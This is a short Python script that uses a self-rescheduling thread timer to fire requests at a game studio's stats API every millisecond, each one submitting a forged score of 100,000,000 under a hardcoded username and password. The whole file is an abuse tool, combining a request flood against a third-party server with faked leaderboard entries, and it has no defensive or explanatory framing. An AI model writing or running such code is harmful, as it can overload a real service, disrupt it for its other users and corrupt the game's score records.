import threading
import requests
import random

def spam():
    threading.Timer(0.001, spam).start()
    requests.get("http://api.xgenstudios.com/?method=xgen.stats.submit&username=weathernowdays&password=lol&game_id=TW3&stat_id=okay&value=100000000")
spam()
